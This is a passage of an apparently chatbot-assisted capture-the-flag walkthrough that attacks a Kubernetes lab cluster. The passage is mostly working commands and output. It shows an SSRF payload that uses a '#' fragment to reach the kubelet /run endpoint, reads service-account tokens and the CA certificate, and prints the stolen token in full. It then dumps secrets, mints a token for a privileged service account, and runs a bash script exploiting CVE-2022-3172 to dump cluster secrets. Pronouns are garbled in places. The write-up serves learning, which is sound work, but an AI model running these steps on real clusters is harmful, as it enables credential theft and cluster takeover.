                return nil, fmt.Errorf("failed to connect to kubelet: %w", err)
        }
        defer resp.Body.Close()

        if resp.StatusCode != http.StatusOK {
                body, _ := io.ReadAll(resp.Body)
                log.Printf("Kubelet error response: %d - %s", resp.StatusCode, string(body))
                return nil, fmt.Errorf("kubelet returned status %d: %s", resp.StatusCode, string(body))
        }

        return io.ReadAll(resp.Body) 
}

func isInNodeSubnet(targetIP string) bool {
        target := net.ParseIP(targetIP)
        if target == nil  {
                return false
        }
        _, subnet, err := net.ParseCIDR(nodeSubnet)
        if err != nil {
                return false
        }
        return subnet.Contains(target)
}root@test:~# 
```


Excellent. You have the source code. As an analyst looking for vulnerabilities, this Go file screams SSRF (Server-Side Request Forgery).

Look at how the `handleRequest` function builds the target URL:
```go
targetUrl := fmt.Sprintf("https://%s:10250/%s/%s/%s/%s", req.NodeIP, kubeletEndpoint, req.PodNamespace, req.PodName, req.ContainerName)
```

The application takes `req.NodeIP` directly from our unauthenticated JSON POST request and concatenates it into the URL. While the `validateKubeletUrl` function checks if the hostname is a valid IP in the subnet, it completely fails to sanitize the input against path injection or URL fragments. 

If we supply `172.30.0.2:10250/run/app/app-blog/app-blog?cmd=id#` as the `node_ip`, the built URL becomes:
`https://172.30.0.2:10250/run/app/app-blog/app-blog?cmd=id#:10250/checkpoint/app/app-blog/app-blog`

The `#` turns the rest of the hardcoded URL into a fragment, causing the Kubelet API to ignore it. This redirects the request to the Kubelet's `/run` endpoint, allowing arbitrary command execution on the `app-blog` pod!


### SSRF Exploitation & Token Theft

**1. Locate the Service:**
First, verify the internal DNS name of the vulnerable application. The CTF environment has `coredns-enum` installed.
```bash
root@test:~# coredns-enum --mode bruteforce --cidr 10.43.0.0/16 --zone cluster.local
6:12PM INF Detected nameserver as 10.43.1.10:53
6:12PM INF Scanning range 10.43.0.0 to 10.43.255.255, 65536 hosts
+-++-+--+--+
|  NAMESPACE  |       NAME       |   SVC IP    |      SVC PORT      | ENDPOINTS |
+-++-+--+--+
| app         | app-blog-service | 10.43.1.36  | ??                 |           |
|             | k8s-debug-bridge | 10.43.1.168 | ??                 |           |
| default     | kubernetes       | 10.43.1.1   | 443/tcp (https)    |           |
| kube-system | kube-dns         | 10.43.1.10  | 53/udp (dns)       |           |
|             |                  |             | 53/tcp (dns-tcp)   |           |
|             |                  |             | 9153/tcp (metrics) |           |
+-++-+--+--+
root@test:~# 
```


**2. Steal the Service Account Token:**
Execute the SSRF payload against the `/checkpoint` endpoint to read the token from the `app-blog` pod.
```bash
root@test:~# curl -s http://k8s-debug-bridge.app/checkpoint -d '{"node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/token#", "pod": "app-blog", "namespace": "app", "container": "app-blog"}'
eyJhbGciOiJSUzI1NiIsImtpZCI6IjVjWHc0NnVkX0RVeHpLb05zenduT2t6WTUxOTJhTmVSSnpuWFQ5VGp5TEEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODA4MDcyMDA0LCJpYXQiOjE3NzY1MzYwMDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZGFjM2QzYWQtMmMzYy00NmIxLTk5YmMtMzdkYTE0MzA3YWQ0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJhcHAiLCJub2RlIjp7Im5hbWUiOiJub2RlciIsInVpZCI6IjgwMWY3YjVkLTIzMzItNDQzYS05ZDQ0LWExOTBkMWM5MzM0ZCJ9LCJwb2QiOnsibmFtZSI6ImFwcC1ibG9nIiwidWlkIjoiYjJhMGM5NDctOWQzYi00ZTk1LTk4ZmYtZmNkMjU0NDExNjhmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhcHAiLCJ1aWQiOiI2Y2JiNTU4Ny05OWM5LTQ0YWQtYTgzYi1lMWVlOTYwZTI5NjQifSwid2FybmFmdGVyIjoxNzc2NTM5NjExfSwibmJmIjoxNzc2NTM2MDA0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YXBwOmFwcCJ9.uKi1EwBRdkVlDy73RzXnpJshgU0N-qpCjTdiCVUHuldcBQppz6ROgD2KRens1UcqwvVuRhSMbgg5zRF8iSnLwhLjruhs82h_hOuj8GYhvBAhYrPqR7fS2CGViES4wtANoNYeabw8LDNt696ks8pl4mhjLzKUsz-s74AiYPBYbV_PdIHf9KhB1OmPAV_M2YVzp5t6OhP17zAh2fijKG_LTq0WCu7tyZOx79i8KlEQTC-hF0ETFyJXHBIp1gw4BdmFYgIrRUOyO6gDZ_bPCygPlPykcXLZZBb7LT1yqOuaGffXuB1AGKDm3QuYvXF_KJ2sy-Ay_x-y7L3AhNoEa3C_Mw
root@test:~# 
```

**3. Steal the Certificate Authority (CA) file:**

You will also need the cluster's CA cert to build a valid `kubeconfig` file later. Read it and convert it to base64 in one go:

```bash
root@test:~# curl -s http://k8s-debug-bridge.app/checkpoint -d '{"node_ip": "172.30.0.2:10250/run/app/app-blog/app-blog?cmd=cat+/var/run/secrets/kubernetes.io/serviceaccount/ca.crt#", "pod": "app-blog", "namespace": "app", "container": "app-blog"}' | base64 -w 0
LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3SGhjTk1qVXhNREkyTVRrMU9EUTFXaGNOTXpVeE1ESTBNVGsxT0RRMQpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTVXFNQk9NbFBxZ2wzOFpRcHpZQWtScUgrWEhMRXhWN0dyNDVHNCthQTQKaU1pUzRHakd0RlJFcWhtNXlnb2ZTd3dweE54d0RKdXhIcjBOQzIzMjVZNUxvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXZuT2ZuRURGRDJoZ001ZWlhVm1wCkZnMW9kVE13Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnWlI5bVVzWHlmVXlLeWFMR1QwVTgrRkl1azdId05GNDkKM2RsSFV1NkVGbXNDSVFEMGpZekY3WFluWXRnd1NzQU54VWNWcDM5OXFXMjRIYTNGemcrV2ZIK2tBQT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
root@test:~#
```

Excellent work! We've successfully exploited the SSRF vulnerability, bypassed the application's basic filtering, and extracted both the `app-blog` pod's Service Account token and the cluster's Certificate Authority (CA) certificate. 

This is a massive step forward. By dumping this token, We've essentially stolen the identity of the `app-blog` application. 

Here is exactly how this SSRF vulnerability works under the hood. The parameter injection allows We to trick the `fmt.Sprintf` function into ignoring the intended path and routing the request directly to the Kubelet's `/run` API, executing arbitrary commands on the target container.

### Understanding the SSRF Payload

This interactive widget demonstrates how Our manipulated `node_ip` string altered the final URL generated by the Go application. You can adjust the parameters to see how the Kubelet URL is constructed and where the vulnerability lies.

```json?chameleon
{"component":"LlmGeneratedComponent","props":{"height":"600px","prompt":"Create an interactive URL constructor tool. Objective: Demonstrate how the SSRF payload modifies the constructed Kubelet URL. Data State: Initial node_ip is '172.30.0.2', kubeletEndpoint is 'checkpoint', podNamespace is 'app', podName is 'app-blog', containerName is 'app-blog'. Strategy: Form LaWet. Inputs: Text input for 'node_ip', dropdowns or text inputs for the other parameters. Behavior: Display the Golang code snippet `targetUrl := fmt.Sprintf(\"https://%s:10250/%s/%s/%s/%s\", req.NodeIP, kubeletEndpoint, req.PodNamespace, req.PodName, req.ContainerName)`. Below that, display the dynamically generated URL based on the inputs. Include a button that auto-fills the 'node_ip' with the malicious payload `172.30.0.2:10250/run/app/app-blog/app-blog?cmd=id#` and visually highlight how the `#` symbol truncates the rest of the generated URL, changing the effective endpoint from '/checkpoint' to '/run'.","id":"im_9b99531e28e5d527"}}
```

Now that we possess this new identity, we need to test what it can do. We will build a temporary `kubeconfig` file so that our local `kubectl` command authenticates as the `app-blog` service account rather than our initial, highly restricted `test-sa` account.

### Identity Pivoting & RBAC Enumeration

**1. Create the Kubeconfig File:**
Copy and paste this entire block into Our terminal. It will create a file named `app-kubeconfig.yaml` using the exact CA certificate and token We just extracted.

```bash
cat <<EOF > app-kubeconfig.yaml
apiVersion: v1
kind: Config
clusters:
- cluster:
    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3SGhjTk1qVXhNREkyTVRrMU9EUTFXaGNOTXpVeE1ESTBNVGsxT0RRMQpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTVXFNQk9NbFBxZ2wzOFpRcHpZQWtScUgrWEhMRXhWN0dyNDVHNCthQTQKaU1pUzRHakd0RlJFcWhtNXlnb2ZTd3dweE54d0RKdXhIcjBOQzIzMjVZNUxvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXZuT2ZuRURGRDJoZ001ZWlhVm1wCkZnMW9kVE13Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnWlI5bVVzWHlmVXlLeWFMR1QwVTgrRkl1azdId05GNDkKM2RsSFV1NkVGbXNDSVFEMGpZekY3WFluWXRnd1NzQU54VWNWcDM5OXFXMjRIYTNGemcrV2ZIK2tBQT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
    server: https://10.43.1.1:443 
  name: my-cluster
contexts:
- context:
    cluster: my-cluster
    namespace: app
    user: app-sa
  name: app-context
current-context: app-context
users:
- name: app-sa
  user:
    token: eyJhbGciOiJSUzI1NiIsImtpZCI6IjVjWHc0NnVkX0RVeHpLb05zenduT2t6WTUxOTJhTmVSSnpuWFQ5VGp5TEEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODA4MDcyMDA0LCJpYXQiOjE3NzY1MzYwMDQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiZGFjM2QzYWQtMmMzYy00NmIxLTk5YmMtMzdkYTE0MzA3YWQ0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJhcHAiLCJub2RlIjp7Im5hbWUiOiJub2RlciIsInVpZCI6IjgwMWY3YjVkLTIzMzItNDQzYS05ZDQ0LWExOTBkMWM5MzM0ZCJ9LCJwb2QiOnsibmFtZSI6ImFwcC1ibG9nIiwidWlkIjoiYjJhMGM5NDctOWQzYi00ZTk1LTk4ZmYtZmNkMjU0NDExNjhmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhcHAiLCJ1aWQiOiI2Y2JiNTU4Ny05OWM5LTQ0YWQtYTgzYi1lMWVlOTYwZTI5NjQifSwid2FybmFmdGVyIjoxNzc2NTM5NjExfSwibmJmIjoxNzc2NTM2MDA0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YXBwOmFwcCJ9.uKi1EwBRdkVlDy73RzXnpJshgU0N-qpCjTdiCVUHuldcBQppz6ROgD2KRens1UcqwvVuRhSMbgg5zRF8iSnLwhLjruhs82h_hOuj8GYhvBAhYrPqR7fS2CGViES4wtANoNYeabw8LDNt696ks8pl4mhjLzKUsz-s74AiYPBYbV_PdIHf9KhB1OmPAV_M2YVzp5t6OhP17zAh2fijKG_LTq0WCu7tyZOx79i8KlEQTC-hF0ETFyJXHBIp1gw4BdmFYgIrRUOyO6gDZ_bPCygPlPykcXLZZBb7LT1yqOuaGffXuB1AGKDm3QuYvXF_KJ2sy-Ay_x-y7L3AhNoEa3C_Mw
EOF
```

**2. Check the New Permissions:**
Now, let's see what this new identity allows us to do in the cluster. Run this command:
```bash
root@test:~# kubectl --kubeconfig=app-kubeconfig.yaml auth can-i --list
Error from server (Forbidden): selfsubjectrulesreviews.authorization.k8s.io is forbidden: User "system:serviceaccount:app:app" cannot create resource "selfsubjectrulesreviews" in API group "authorization.k8s.io" at the cluster scope
root@test:~# 
```

Ah, the CTF author threw a classic curveball! 

The `auth can-i --list` command works by creating a `SelfSubjectRulesReview` resource on the API server, asking it to calculate all of Our permissions. The author intentionally denied Our new `app` service account the ability to create that specific resource. 

This means We cannot automatically ask the API server what Our permissions are. You have to "blindly" guess what We are allowed to do by manually testing different commands until one succeeds. 

Fortunately, in Our original walkthrough, We noted that after a lot of manual trial and error, We discovered this account has one very powerful permission: **the ability to read secrets in its own namespace.**

Let's manually verify this and dump the secrets. 

### (Continued): Manual RBAC Enumeration

**1. Test Secret Access:**
Since we can't use `--list`, let's just try to list the secrets in the `app` namespace directly:
```bash
root@test:~# kubectl --kubeconfig=app-kubeconfig.yaml get secrets -n app
NAME           TYPE     DATA   AGE
user-johndoe   Opaque   3      173d
root@test:~#
```

**2. Dump the Secrets:**
If the first command works and lists the secrets, immediately dump all of them in YAML format so we can inspect their contents (like tokens, passwords, or certificates):
```bash
root@test:~# kubectl --kubeconfig=app-kubeconfig.yaml get secrets -n app -o yaml
apiVersion: v1
items:
- apiVersion: v1
  data:
    createdAt: MjAyNS0xMC0yNlQxOTo1OToyM1o=
    passwordHash: JGFyZ29uMmlkJHY9MTkkbT04MTkyLHQ9MSxwPTEkSlk5UVM2WXNXQVVoaVFvK1dIK2FkdyRKYmZIZHYzVGVqd1gyNFN2cy8yazhXMEN0TmNUa1FWSENSaG80OWQ0TW5J
    username: am9obmRvZQ==
  kind: Secret
  metadata:
    creationTimestamp: "2025-10-26T19:59:23Z"
    labels:
      app: hustlehub
      component: auth
    name: user-johndoe
    namespace: app
    resourceVersion: "410"
    uid: 7c7ea084-5053-462b-ae66-b5ac3be553f2
  type: Opaque
kind: List
metadata:
  resourceVersion: ""
root@test:~# 
```

We successfully dumped the secret! Let's decode what we found. 

If we run those base64 strings through a decoder, we get:
* **username:** `johndoe`
* **passwordHash:** `$argon2id$v=19$m=8192,t=1,p=1$JY9QS6YsWAUhiQo+WH+adw$JbfHdv3TejwX24Svs/2k8W0CtNcTkQVHCRho49d4MnI`

This looks like the backend database credentials for the web application itself. While interesting, cracking an Argon2 hash takes time, and it likely only gives us access to the blog application, not the `kube-system` namespace where our flag lives. We can treat this as a rabbit hole for now.

### The Brilliant Pivot (Token Minting)

Here is where the CTF gets really clever, and Our walkthrough notes captured this perfectly. 

Earlier, when we mapped the network with `coredns-enum`, we saw the `k8s-debug-bridge` service. That service is running under its own Service Account (also named `k8s-debug-bridge`). Because of the way that specific application functions (proxying requests to the Kubelet), its service account must have significant cluster permissions!

Since Kubernetes v1.24, service accounts no longer automatically generate long-lived token Secrets. **However, if our newly stolen `app-sa` identity has the hidden permission to *create* secrets, we can manually mint a token for the `k8s-debug-bridge` account!**

Let's test this theory. We will try to create a special `ServiceAccountToken` secret explicitly linked to the `k8s-debug-bridge` account. If the API server accepts it, we just hijacked our third identity.

### Escalating to the Debug Bridge Identity

**1. Create the Malicious Secret Manifest:**
Run this to create a file named `secret.yml`. This YAML tells Kubernetes to generate a token for the `k8s-debug-bridge` account and store it in this secret.
```bash
cat <<EOF > secret.yml
apiVersion: v1
kind: Secret
metadata:
  name: debug-bridge-token
  namespace: app
  annotations:
    kubernetes.io/service-account.name: "k8s-debug-bridge"
type: kubernetes.io/service-account-token
EOF
```

![Wiz](wiz_test_toekn_created.png)

**2. Apply the Secret using Our stolen identity:**

```bash
root@test:~# kubectl --kubeconfig=app-kubeconfig.yaml apply -f secret.yml
secret/debug-bridge-token created
```

**3. Retrieve Our prize:**
If step 2 says "created" and doesn't throw a Forbidden error, the API server just handed We the keys. Dump the newly minted token:

```bash
root@test:~# kubectl --kubeconfig=app-kubeconfig.yaml get secret debug-bridge-token -o yaml
apiVersion: v1
data:
  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3SGhjTk1qVXhNREkyTVRrMU9EUTFXaGNOTXpVeE1ESTBNVGsxT0RRMQpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTmpFMU1EZzNNalV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTVXFNQk9NbFBxZ2wzOFpRcHpZQWtScUgrWEhMRXhWN0dyNDVHNCthQTQKaU1pUzRHakd0RlJFcWhtNXlnb2ZTd3dweE54d0RKdXhIcjBOQzIzMjVZNUxvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXZuT2ZuRURGRDJoZ001ZWlhVm1wCkZnMW9kVE13Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnWlI5bVVzWHlmVXlLeWFMR1QwVTgrRkl1azdId05GNDkKM2RsSFV1NkVGbXNDSVFEMGpZekY3WFluWXRnd1NzQU54VWNWcDM5OXFXMjRIYTNGemcrV2ZIK2tBQT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
  namespace: YXBw
  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqVmpXSGMwTm5Wa1gwUlZlSHBMYjA1emVuZHVUMnQ2V1RVeE9USmhUbVZTU25wdVdGUTVWR3A1VEVFaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpoY0hBaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sWTNKbGRDNXVZVzFsSWpvaVpHVmlkV2N0WW5KcFpHZGxMWFJ2YTJWdUlpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVibUZ0WlNJNkltczRjeTFrWldKMVp5MWljbWxrWjJVaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTFhV1FpT2lJMk5XVTFNV0k1TXkxa05UVTRMVFF3TWpVdFlXVTFOQzAxWTJGa1pHTTNaV05qWWpnaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZZWEJ3T21zNGN5MWtaV0oxWnkxaWNtbGtaMlVpZlEuRk5zY0dZa3VONlZnTXRLMWpxWUtwcVljaHNubGUzUG5Zb0NHemdheVJRMFU3TlE0Y2lkLWcyb2MxU0cxYm5FSEpIa1FWMEYteXRPZE55RHJaNllLYlZIZ2JWNG03U3BUWmdyZkNielZnZnV1RzNkLW5VZTlkejRmc2VVa0ZWNFZDSWNSdkdvS3RTSmEtdHNyV0J0UFY4cTI0Nmg2SndqVG9LajVmN3pHZEZZc2ZULXhQQXJzeXROaU9qWlo0NkJQeFo4eTJ4RkR5VFpBRFBILW5WWkFvWFU3YTVTZHNQRU91WUU1el9zN3N6N0Z0WmhPa2FSdy12UTNhUll4WjAtdW02SkRLaUxQN1hZMFM1RFRfLTNsSTJwQldZWE1YM3QxWk5JYUwwSUoxbWZjX1JMQXp6RjBObFhfaHZVVFhaa1ByLVpzTVk4UnQzZmNySGUtWDdaa3BB
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{"kubernetes.io/service-account.name":"k8s-debug-bridge"},"name":"debug-bridge-token","namespace":"app"},"type":"kubernetes.io/service-account-token"}
    kubernetes.io/service-account.name: k8s-debug-bridge
    kubernetes.io/service-account.uid: 65e51b93-d558-4025-ae54-5caddc7eccb8
  creationTimestamp: "2026-04-18T18:19:52Z"
  name: debug-bridge-token
  namespace: app
  resourceVersion: "1454"
  uid: 4b390878-3153-404e-9684-7ef5caf7921d
type: kubernetes.io/service-account-token
root@test:~# 
```

Boom. You just forged a token for the `k8s-debug-bridge` service account. 

Identifying and escalating privileges by minting a token for a dormant account is a top-tier Red Team maneuver. You've officially bypassed the RBAC restrictions of both Our initial pod and the web application. 

This new identity has a very specific, dangerous set of permissions designed to let it act as a bridge. It has `get` permissions on `nodes/proxy` and `patch` permissions on `nodes/status`. 

This makes the cluster vulnerable to **CVE-2022-3172**. 

Here is the kill chain: We are going to use our new token to patch the node's status, telling the API Server that the Kubelet is actually running on port 6443 (the API Server's own port). When we then ask the API Server to proxy a request to the Kubelet, it will route the request to itself, utilizing its own internal cluster-admin credentials to dump the secrets.

Here are Our final commands to execute the exploit and capture the flag.

### The Final Exploit (CVE-2022-3172)

**1. Extract and Decode the Token:**
First, let's grab that massive base64 string, decode it, and store it in an environment variable so our exploit script can use it easily.
```bash
export TOKEN=$(kubectl --kubeconfig=app-kubeconfig.yaml -n app get secret debug-bridge-token -o jsonpath='{.data.token}' | base64 -d)
```

**2. Verify the Exploit Path:**

Just to confirm we have the keys to the kingdom, check the permissions of this new token:

```bash
root@test:~# kubectl --token=$TOKEN auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
nodes/checkpoint                                []                                     []               [get create patch]
nodes/proxy                                     []                                     []               [get create patch]
nodes/status                                    []                                     []               [get create patch]
nodes                                           []                                     []               [get list watch]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
root@test:~# 
```

![Wiz](wiz_test_toekn_cve.png)

**3. Write the Exploit Script:**

Copy and paste this entire block to create the exploit script. This script fetches the node status, alters the port mapping locally, patches the live node, and then fires the proxy request.

![Wiz](wiz_test_script.png)


```bash
cat <<'EOF' > script.sh
#!/bin/bash
set -euo pipefail

readonly NODE="noder"                 
readonly API_SERVER_PORT=6443         
readonly API_SERVER_IP="172.30.0.2"   
readonly BEARER_TOKEN="${TOKEN}"      

# Fetch node status
curl -k \
  -H "Authorization: Bearer ${BEARER_TOKEN}" \
  -H "Content-Type: application/json" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status" \
  > "${NODE}-orig.json"

# Patch kubelet port in status to point to the API server
sed "s/\"Port\": 10250/\"Port\": ${API_SERVER_PORT}/g" \
  "${NODE}-orig.json" > "${NODE}-patched.json"

# Update live node status
curl -k \
  -H "Authorization: Bearer ${BEARER_TOKEN}" \
  -H "Content-Type: application/merge-patch+json" \
  -X PATCH \
  -d "@${NODE}-patched.json" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/status"

# Access kubelet via API server node proxy (Dumps Secrets)
curl -kv \
  -H "Authorization: Bearer ${BEARER_TOKEN}" \
  "https://${API_SERVER_IP}:${API_SERVER_PORT}/api/v1/nodes/${NODE}/proxy/api/v1/secrets"
EOF
```

**4. Execute and Loot:**
Make the script executable and run it. 
```bash
chmod +x script.sh
root@test:~# ./script.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8259    0  8259    0     0   210k      0 --:--:-- --:--:-- --:--:--  212k
{
  "kind": "Node",
  "apiVersion": "v1",
  "metadata": {
    "name": "noder",
    "uid": "801f7b5d-2332-443a-9d44-a190d1c9334d",
    "resourceVersion": "1532",
    "creationTimestamp": "2025-10-26T19:58:53Z",
    "labels": {
      "beta.kubernetes.io/arch": "amd64",
      "beta.kubernetes.io/os": "linux",
      "kubernetes.io/arch": "amd64",
      "kubernetes.io/hostname": "noder",
      "kubernetes.io/os": "linux",
      "node-role.kubernetes.io/control-plane": "true",
      "node-role.kubernetes.io/master": "true"
    },
    "annotations": {
      "flannel.alpha.coreos.com/backend-data": "null",
      "flannel.alpha.coreos.com/backend-type": "host-gw",
      "flannel.alpha.coreos.com/kube-subnet-manager": "true",
      "flannel.alpha.coreos.com/public-ip": "172.30.0.2",
      "k3s.io/node-args": "[\"server\",\"--node-name\",\"noder\",\"--service-cidr\",\"10.43.1.0/24\",\"--flannel-backend\",\"host-gw\",\"--disable-network-policy\",\"--disable\",\"traefik,metrics-server,servicelb,local-storage\",\"--disable-helm-controller\",\"--disable-cloud-controller\",\"--kube-apiserver-arg\",\"watch-cache=false\",\"--kube-apiserver-arg\",\"event-ttl=10m\",\"--kube-apiserver-arg\",\"max-requests-inflight=200\",\"--kube-apiserver-arg\",\"max-mutating-requests-inflight=50\",\"--kube-apiserver-arg\",\"feature-gates=APIResponseCompression=false\",\"--kube-apiserver-arg\",\"enable-priority-and-fairness=false\",\"--kube-apiserver-arg\",\"profiling=false\",\"--kubelet-arg\",\"container-log-max-size=10Mi\",\"--kubelet-arg\",\"container-log-max-files=2\",\"--tls-san\",\"0.0.0.0\"]",
      "k3s.io/node-config-hash": "IJVRWFSMN5WVNV6RGGZ4BDPM4TQM4WYR7H55R3723GZZ6O4QCG7Q====",
      "k3s.io/node-env": "{\"K3S_KUBECONFIG_OUTPUT\":\"/output/kubeconfig.yaml\",\"K3S_TOKEN\":\"********\"}",
      "node.alpha.kubernetes.io/ttl": "0",
      "volumes.kubernetes.io/controller-managed-attach-detach": "true"
    },
    "finalizers": [
      "wrangler.cattle.io/node"
    ],
    "managedFields": [
      {
        "manager": "k3s-supervisor@noder",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-10-26T19:58:55Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:metadata": {
            "f:finalizers": {
              ".": {},
              "v:\"wrangler.cattle.io/node\"": {}
            },
            "f:labels": {
              "f:node-role.kubernetes.io/control-plane": {},
              "f:node-role.kubernetes.io/master": {}
            }
          }
        }
      },
      {
        "manager": "k3s",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-10-26T19:58:59Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:metadata": {
            "f:annotations": {
              ".": {},
              "f:k3s.io/node-args": {},
              "f:k3s.io/node-config-hash": {},
              "f:k3s.io/node-env": {},
              "f:node.alpha.kubernetes.io/ttl": {},
              "f:volumes.kubernetes.io/controller-managed-attach-detach": {}
            },
            "f:labels": {
              ".": {},
              "f:beta.kubernetes.io/arch": {},
              "f:beta.kubernetes.io/os": {},
              "f:kubernetes.io/arch": {},
              "f:kubernetes.io/hostname": {},
              "f:kubernetes.io/os": {}
            }
          },
          "f:spec": {
            "f:podCIDR": {},
            "f:podCIDRs": {
              ".": {},
              "v:\"10.42.0.0/24\"": {}
            }
          }
        }
      },
      {
        "manager": "k3s",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2026-04-18T18:20:18Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:metadata": {
            "f:annotations": {
              "f:flannel.alpha.coreos.com/backend-data": {},
              "f:flannel.alpha.coreos.com/backend-type": {},
              "f:flannel.alpha.coreos.com/kube-subnet-manager": {},
              "f:flannel.alpha.coreos.com/public-ip": {}
            }
          },
          "f:status": {
            "f:conditions": {
              "k:{\"type\":\"DiskPressure\"}": {
                "f:lastHeartbeatTime": {}
              },
              "k:{\"type\":\"MemoryPressure\"}": {
                "f:lastHeartbeatTime": {}
              },
              "k:{\"type\":\"PIDPressure\"}": {
                "f:lastHeartbeatTime": {}
              },
              "k:{\"type\":\"Ready\"}": {
                "f:lastHeartbeatTime": {},
                "f:lastTransitionTime": {},
                "f:message": {},
                "f:reason": {},
                "f:status": {}
              }
            },
            "f:images": {}
          }
        },
        "subresource": "status"
      },
      {
        "manager": "curl",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2026-04-18T18:24:05Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:status": {
            "f:daemonEndpoints": {
              "f:kubeletEndpoint": {
